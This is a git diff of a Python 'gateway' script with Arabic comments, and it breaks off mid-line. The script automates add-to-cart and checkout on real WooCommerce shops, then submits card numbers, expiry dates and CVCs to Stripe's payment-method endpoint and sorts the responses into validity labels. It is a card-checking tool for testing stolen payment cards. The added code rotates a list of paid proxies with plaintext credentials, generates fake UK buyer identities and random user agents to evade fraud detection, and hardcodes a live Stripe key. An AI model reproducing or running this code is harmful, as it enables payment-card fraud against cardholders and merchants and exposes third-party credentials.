@@ -1,4 +1,4 @@
-# ==================== gatet.py (للموقع الجديد Anas-Emporium - Stripe Gateway) ====================
+# ==================== gatet.py (تم التحديث لموقع Gruum - Stripe Payments) ====================
 
 import requests, json, re, random, sys, os, time, base64, uuid
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -7,6 +7,39 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from user_agent import generate_user_agent
 from bs4 import BeautifulSoup
 import string
+
+# ==================== قائمة البروكسيات ====================
+PROXIES_LIST = [
+    {'http': 'http://206223:Fyg3NR65@107.172.12.54:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.54:8800'},
+    {'http': 'http://206223:Fyg3NR65@107.172.12.5:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.5:8800'},
+    {'http': 'http://206223:Fyg3NR65@107.172.12.24:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.24:8800'},
+    {'http': 'http://206222:umh2TcPh@69.58.0.4:8800', 'https': 'http://206222:umh2TcPh@69.58.0.4:8800'},
+    {'http': 'http://206223:Fyg3NR65@107.172.12.104:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.104:8800'},
+    {'http': 'http://206222:umh2TcPh@69.58.0.27:8800', 'https': 'http://206222:umh2TcPh@69.58.0.27:8800'},
+    {'http': 'http://206222:umh2TcPh@69.58.0.24:8800', 'https': 'http://206222:umh2TcPh@69.58.0.24:8800'},
+    {'http': 'http://206222:umh2TcPh@69.58.0.5:8800', 'https': 'http://206222:umh2TcPh@69.58.0.5:8800'},
+    {'http': 'http://206222:umh2TcPh@69.58.0.2:8800', 'https': 'http://206222:umh2TcPh@69.58.0.2:8800'},
+    {'http': 'http://206222:umh2TcPh@69.4.93.141:8800', 'https': 'http://206222:umh2TcPh@69.4.93.141:8800'},
+    {'http': 'http://206222:umh2TcPh@69.4.93.152:8800', 'https': 'http://206222:umh2TcPh@69.4.93.152:8800'},
+    {'http': 'http://206222:umh2TcPh@69.4.93.144:8800', 'https': 'http://206222:umh2TcPh@69.4.93.144:8800'},
+    {'http': 'http://206222:umh2TcPh@69.4.93.130:8800', 'https': 'http://206222:umh2TcPh@69.4.93.130:8800'},
+    {'http': 'http://206221:8bVhNtgj@85.209.138.187:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.187:8800'},
+    {'http': 'http://206221:8bVhNtgj@85.209.138.195:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.195:8800'},
+    {'http': 'http://206221:8bVhNtgj@85.209.138.239:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.239:8800'},
+    {'http': 'http://206221:8bVhNtgj@85.209.138.210:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.210:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800'},
+    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800'},
+]
+
+def get_random_proxy():
+    return random.choice(PROXIES_LIST)
 
 def clean_html(text):
     if not text:
@@ -21,50 +54,50 @@ def extract_reason(text):
         return match.group(1).strip()
     return None
 
-def generate_valid_us_data():
-    """توليد بيانات عنوان أمريكي صالح"""
-    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
-                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
-                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Conane', 'Kand']
-    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
-                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
-                  'Caril', 'Hatleyb', 'Payne', 'Betran']
+def generate_valid_email():
+    domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'icloud.com', 'protonmail.com']
+    names = ['john', 'peter', 'michael', 'david', 'james', 'robert', 'thomas', 'william', 'daniel', 'paul']
+    name1 = random.choice(names)
+    name2 = random.choice(names)
+    number = random.randint(1, 9999)
+    domain = random.choice(domains)
+    formats = [f"{name1}.{name2}{number}@{domain}", f"{name1}{number}@{domain}", f"{name1}_{name2}{number}@{domain}"]
+    return random.choice(formats).lower()
+
+def generate_uk_data():
+    first_names = ['John', 'Peter', 'Michael', 'David', 'James', 'Robert', 'Thomas', 'William', 'Daniel', 'Paul',
+                   'Andrew', 'Mark', 'Christopher', 'Matthew', 'Joshua', 'Benjamin', 'Nicholas', 'Joseph', 'Ryan']
+    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson']
     
     first = random.choice(first_names)
     last = random.choice(last_names)
     
-    us_states = ['AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 'HI', 'ID', 'IL', 'IN', 'IA', 
-                 'KS', 'KY', 'LA', 'ME', 'MD', 'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 
-                 'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 'SD', 'TN', 'TX', 'UT', 'VT', 
-                 'VA', 'WA', 'WV', 'WI', 'WY', 'VI']
-    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin',
-                 'New York', 'Miami', 'Seattle', 'Denver', 'Boston', 'Atlanta', 'Detroit', 'Portland', 'Nashville']
-    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301', '10001', '33101']
-    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '5640439480']
-    us_addresses = ['75 po box', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive']
+    postcodes = ['WA4 1DZ', 'SW1A 1AA', 'M1 1AE', 'B1 1TT', 'LS1 1UR', 'G1 1XU', 'EH1 1QQ', 'CF10 1EP', 'NE1 1EE']
+    cities = ['London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle']
+    streets = ['Baker Street', 'Oxford Street', 'King Street', 'Queen Street', 'Church Road', 'High Street', 'Station Road']
+    phones = ['07123456789', '07234567890', '07345678901', '07456789012', '07567890123', '07678901234']
     
-    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
-    email_domain = random.choice(email_domains)
+    street_num = random.randint(1, 200)
+    full_address = f"{street_num} {random.choice(streets)}"
+    city = random.choice(cities)
+    postcode = random.choice(postcodes)
+    
+    email = generate_valid_email()
     
     return {
         'first_name': first,
         'last_name': last,
-        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
-        'phone': random.choice(us_phones),
-        'address_1': random.choice(us_addresses),
-        'city': random.choice(us_cities),
-        'state': random.choice(us_states),
-        'postcode': random.choice(us_postcodes),
-        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
+        'email': email,
+        'phone': random.choice(phones),
+        'address_1': full_address,
+        'city': city,
+        'postcode': postcode,
+        'company': random.choice(['Apple', 'Google', 'Microsoft', 'Amazon', 'Facebook']) if random.choice([True, False]) else ''
     }
 
 def ch(ccx):
-    print("\n" + "="*70)
-    print("[DEBUG] STARTING NEW CHECK - Anas-Emporium (Stripe Gateway - US)")
-    print("="*70)
-    
     ccx = ccx.strip()
-    n = ccx.split("|")[0].replace(' ', '')
+    n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
     yy = ccx.split("|")[2]
     cvc = ccx.split("|")[3]
@@ -72,353 +105,241 @@ def ch(ccx):
     if len(yy) == 2:
         yy = '20' + yy
     
-    user = generate_user_agent()
-    fake_data = generate_valid_us_data()
-    session_id = str(uuid.uuid4())
-    correlation_id = str(uuid.uuid4())[:24]
-    r = requests.session()
+    max_retries = 3
     
-    print(f"[1/7] Using User-Agent: {user[:50]}...")
-    print(f"[1/7] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
-    print(f"[1/7] Address: {fake_data['address_1']}, {fake_data['city']}, {fake_data['state']}, {fake_data['postcode']}")
-    
-    # ================ 1. ADD TO CART (منتج مع variation) ================
-    print("\n[2/7] Adding product to cart...")
-    
-    cookies_add = {
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
-        '__stripe_mid': '58841910-b5b2-4216-ac6b-2d942142e94ce54754',
-        '__stripe_sid': '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6',
-    }
-    
-    files = {
-        'attribute_color': (None, 'White'),
-        'quantity': (None, '1'),
-        'add-to-cart': (None, '2033'),
-        'product_id': (None, '2033'),
-        'variation_id': (None, '2039'),
-    }
-    
-    headers_add = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-        'accept-language': 'en-US',
-        'origin': 'https://anas-emporium.com',
-        'referer': 'https://anas-emporium.com/product/simple-temperament-niche-design-pull-out-ladies-bracelet/',
-        'user-agent': user,
-        'upgrade-insecure-requests': '1',
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    response = r.post('https://anas-emporium.com/product/simple-temperament-niche-design-pull-out-ladies-bracelet/', 
-                      headers=headers_add, files=files, cookies=cookies_add)
-    print(f"[2/7] Add to cart status: {response.status_code}")
-    print(f"[2/7] Add to cart response: {response.text[:200]}")
-    
-    if response.status_code != 200:
-        return f'ADD_TO_CART_FAILED'
-    
-    # ================ 2. CHECKOUT PAGE ================
-    print("\n[3/7] Accessing checkout page...")
-    
-    headers_checkout = {
-        'Accept-Language': 'en-US',
-        'Referer': 'https://anas-emporium.com/cart/',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': user,
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    response = r.get('https://anas-emporium.com/checkout/', headers=headers_checkout)
-    print(f"[3/7] Checkout page status: {response.status_code}")
-    
-    if response.status_code != 200:
-        return f'CHECKOUT_PAGE_FAILED'
-    
-    # ================ 3. EXTRACT NONCES ================
-    print("\n[4/7] Extracting nonces...")
-    
-    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
-    if not sec:
-        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
-    if sec:
-        sec = sec.group(1)
-        print(f"[4/7] Found update_order_review nonce: {sec[:20]}...")
-    else:
-        sec = 'edaf945150'
-        print("[4/7] WARNING: Using fallback nonce")
-    
-    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
-    if not check_nonce:
-        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
-    if check_nonce:
-        check_nonce = check_nonce.group(1)
-        print(f"[4/7] Found checkout nonce: {check_nonce[:20]}...")
-    else:
-        check_nonce = '047d7d6468'
-        print("[4/7] WARNING: Using fallback checkout nonce")
-    
-    # استخراج Stripe key
-    stripe_key_match = re.search(r'pk_live_[a-zA-Z0-9]+', response.text)
-    if stripe_key_match:
-        stripe_key = stripe_key_match.group(0)
-        print(f"[4/7] Found Stripe key: {stripe_key[:20]}...")
-    else:
-        stripe_key = 'pk_live_51H1RaXC9vQQqXaaq7qI7eZcBYsVjVmiCJNC0r5zlK6cM5idA0JtKFabs9BRvbLU8DaO2PBh6dz6doU04IzEFSuI100hImGeE5f'
-        print("[4/7] Using fallback Stripe key")
-    
-    # ================ 4. UPDATE ORDER REVIEW ================
-    print("\n[5/7] Updating order review...")
-    
-    cookies_update = {
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
-        'wp_woocommerce_session_f1ff18e17fcd94bf2b9e3d5c17b3e4f8': 't_9eaa8086c9c8b3e968cd370a397d01%7C1779440018%7C1779353618%7C%24generic%24J7RznWHVRXt8tp7z7GkIqv67jqD_cLrzERusaVHs',
-        '__stripe_mid': '58841910-b5b2-4216-ac6b-2d942142e94ce54754',
-        '__stripe_sid': '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6',
-        'woocommerce_items_in_cart': '1',
-        'woocommerce_cart_hash': '531e4a448eed85e8bb08abe41c5848b5',
-    }
-    
-    headers_update = {
-        'accept': '*/*',
-        'accept-language': 'en-US',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://anas-emporium.com',
-        'referer': 'https://anas-emporium.com/checkout/',
-        'user-agent': user,
-        'x-requested-with': 'XMLHttpRequest',
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    params_update = {'wc-ajax': 'update_order_review'}
-    
-    data_update = f'security={sec}&payment_method=stripe&country=US&state={fake_data["state"]}&postcode={fake_data["postcode"]}&city={fake_data["city"]}&address={fake_data["address_1"].replace(" ", "+")}&address_2=&s_country=US&s_state={fake_data["state"]}&s_postcode={fake_data["postcode"]}&s_city={fake_data["city"]}&s_address={fake_data["address_1"].replace(" ", "+")}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fanas-emporium.com%252F%26wc_order_attribution_session_start_time%3D2026-05-20%252008%253A52%253A36%26wc_order_attribution_session_pages%3D13%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{fake_data["email"]}%26billing_first_name%3D{fake_data["first_name"]}%26billing_last_name%3D{fake_data["last_name"]}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{fake_data["address_1"].replace(" ", "+")}%26billing_address_2%3D%26billing_city%3D{fake_data["city"]}%26billing_state%3D{fake_data["state"]}%26billing_postcode%3D{fake_data["postcode"]}%26billing_phone%3D{fake_data["phone"]}%26shipping_first_name%3D{fake_data["first_name"]}%26shipping_last_name%3D{fake_data["last_name"]}%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D{fake_data["city"]}%26shipping_state%3D{fake_data["state"]}%26shipping_postcode%3D{fake_data["postcode"]}%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A1%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A1'
-    
-    response = r.post('https://anas-emporium.com/', params=params_update, headers=headers_update, data=data_update, cookies=cookies_update)
-    print(f"[5/7] Update order review status: {response.status_code}")
-    print(f"[5/7] Update order review response: {response.text[:300]}")
-    
-    # ================ 5. CREATE STRIPE PAYMENT METHOD (Tokenization) ================
-    print("\n[6/7] Creating Stripe payment method...")
-    
-    # توليد معرفات عشوائية جديدة لكل طلب
-    client_session_id = str(uuid.uuid4())
-    elements_session_id = f"elements_session_{random.randint(10, 99)}Iy3mdyjGf{random.randint(1, 9)}"
-    elements_session_config_id = str(uuid.uuid4())
-    guid = f"{str(uuid.uuid4()).replace('-', '')[:24]}"
-    muid = '58841910-b5b2-4216-ac6b-2d942142e94ce54754'
-    sid = '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6'
-    
-    headers_stripe = {
-        'accept': 'application/json',
-        'accept-language': 'en-US',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'user-agent': user,
-        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    # تنسيق رقم البطاقة مع مسافات كل 4 أرقام (لـ Stripe)
-    formatted_card = ' '.join([n[i:i+4] for i in range(0, len(n), 4)])
-    
-    data_stripe = f'billing_details[name]={fake_data["first_name"]}+{fake_data["last_name"]}&billing_details[email]={fake_data["email"]}&billing_details[phone]={fake_data["phone"]}&billing_details[address][city]={fake_data["city"]}&billing_details[address][country]=US&billing_details[address][line1]={fake_data["address_1"].replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={fake_data["postcode"]}&billing_details[address][state]={fake_data["state"]}&type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy[-2:]}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fe27e2486c8%3B+stripe-js-v3%2Fe27e2486c8%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fanas-emporium.com&time_on_page=68457&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_id]={elements_session_id}&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={stripe_key}&_stripe_version=2025-09-30.clover'
-    
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
-    print(f"[6/7] Stripe payment method status: {response.status_code}")
-    
-    # ================ استخراج الـ error من Stripe response ================
-    try:
-        response_json = response.json()
+    for attempt in range(max_retries):
+        proxy = get_random_proxy()
+        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
+        user = generate_user_agent()
+        fake_data = generate_uk_data()
+        session_id = str(uuid.uuid4())
+        correlation_id = str(uuid.uuid4())[:24]
         
-        # التحقق من وجود خطأ
-        if 'error' in response_json:
-            error = response_json['error']
-            error_message = error.get('message', '').lower()
-            error_code = error.get('code', '')
+        r = requests.session()
+        r.proxies = proxy
+        r.verify = False
+        
+        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
+        print(f"[*] Email used: {fake_data['email']}")
+        
+        SITE_URL = 'https://www.gruum.com'
+        PRODUCT_URL = 'https://www.gruum.com/product/eske-storage-carry-tin/'
+        CHECKOUT_URL = 'https://www.gruum.com/checkout/'
+        AJAX_URL = 'https://www.gruum.com/'
+        
+        try:
+            # ================ 1. ADD TO CART (Stripe via gruum_single_product_add_to_cart) ================
+            headers_add = {
+                'authority': 'www.gruum.com',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-US,en;q=0.9',
+                'origin': SITE_URL,
+                'referer': PRODUCT_URL,
+                'user-agent': user,
+                'x-requested-with': 'XMLHttpRequest',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'Connection': 'close',
+            }
             
-            print(f"[6/7] Stripe error: {error_message}")
-            print(f"[6/7] Stripe error code: {error_code}")
+            params_add = {'wc-ajax': 'gruum_single_product_add_to_cart'}
+            data_add = {'quantity': '1', 'product_id': '1600448'}
             
-            # ==================== ردود Stripe المفصلة ====================
-            if 'insufficient funds' in error_message:
-                return 'INSUFFICIENT FUNDS'
-            elif 'your card has been declined' in error_message:
-                return 'CARD DECLINED'
-            elif 'the card was declined' in error_message:
-                return 'CARD DECLINED'
-            elif 'card was declined' in error_message:
-                return 'CARD DECLINED'
-            elif 'your card number is incorrect' in error_message or 'invalid_number' in error_code:
-                return 'INVALID CARD NUMBER'
-            elif 'expired card' in error_message or 'expired_card' in error_code:
-                return 'EXPIRED CARD'
-            elif 'incorrect_cvc' in error_code or 'cvv' in error_message:
-                return 'CVV MISMATCH'
-            elif 'do_not_honor' in error_code:
-                return 'DO NOT HONOR'
-            elif 'fraud' in error_message or 'fraudulent' in error_message:
-                return 'SUSPECTED FRAUD'
-            elif '3d_secure' in error_code or 'authentication_required' in error_code:
-                return '3D SECURE REQUIRED'
-            elif 'processing_error' in error_code:
-                return 'PROCESSOR DECLINED'
+            response = r.post(AJAX_URL, params=params_add, headers=headers_add, data=data_add, timeout=20)
+            if response.status_code != 200:
+                print(f"[!] Add to cart failed with proxy {proxy_ip}, retrying...")
+                continue
+            
+            # ================ 2. CHECKOUT PAGE ================
+            headers_checkout = {
+                'authority': 'www.gruum.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+                'accept-language': 'en-US,en;q=0.9',
+                'referer': PRODUCT_URL,
+                'user-agent': user,
+                'upgrade-insecure-requests': '1',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'Connection': 'close',
+            }
+            
+            response = r.get(CHECKOUT_URL, headers=headers_checkout, timeout=20)
+            if response.status_code != 200:
+                print(f"[!] Checkout page failed with proxy {proxy_ip}, retrying...")
+                continue
+            
+            # ================ 3. EXTRACT TOKENS AND NONCES ================
+            # استخراج update_order_review_nonce
+            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
+            if not sec:
+                sec = '85891d84b9'
             else:
-                return f'STRIPE: {error_message}'
-        
-        # نجاح - استخراج payment method ID
-        payment_method_id = response_json.get('id')
-        if payment_method_id:
-            print(f"[6/7] Got payment method ID: {payment_method_id}")
-        else:
-            print(f"[6/7] No payment method ID in response")
-            return 'STRIPE_TOKENIZATION_FAILED'
+                sec = sec.group(1)
             
-    except Exception as e:
-        print(f"[6/7] Failed to parse Stripe response: {e}")
-        print(f"[6/7] Response text: {response.text[:200]}")
-        return f'STRIPE_ERROR'
+            # استخراج checkout nonce
+            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
+            if not check:
+                check = 'bf10b52fb7'
+            else:
+                check = check.group(1)
+            
+            # ================ 4. UPDATE ORDER REVIEW (Stripe) ================
+            billing_first = fake_data['first_name']
+            billing_last = fake_data['last_name']
+            billing_email = fake_data['email']
+            billing_phone = fake_data['phone']
+            billing_address = fake_data['address_1']
+            billing_city = fake_data['city']
+            billing_postcode = fake_data['postcode']
+            billing_company = fake_data['company']
+            
+            headers_update = {
+                'authority': 'www.gruum.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': SITE_URL,
+                'referer': CHECKOUT_URL,
+                'user-agent': user,
+                'x-requested-with': 'XMLHttpRequest',
+                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'Connection': 'close',
+            }
+            
+            params_update = {'wc-ajax': 'update_order_review'}
+            
+            data_update = f'security={sec}&payment_method=woocommerce_payments&country=GB&state=&postcode=&city=&address=&address_2=&s_country=GB&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.gruum.com%252Fcart%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.gruum.com%252F%26wc_order_attribution_session_start_time%3D2026-05-23%252008%253A27%253A36%26wc_order_attribution_session_pages%3D5%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_phone%3D{billing_phone}%26account_password%3D%26sgm_optin%3D1%26billing_country%3DGB%26sgwcav_postcode_lookup%3D%26sgwcav_address_type%3Dbilling%26sgwcav_append_field%3Dcountry%26sgwcav_complete_fields%3D%255B%2522address_1%2522%252C%2522address_2%2522%252C%2522city%2522%252C%2522state%2522%252C%2522postcode%2522%255D%26billing_address_1%3D{billing_address.replace(" ", 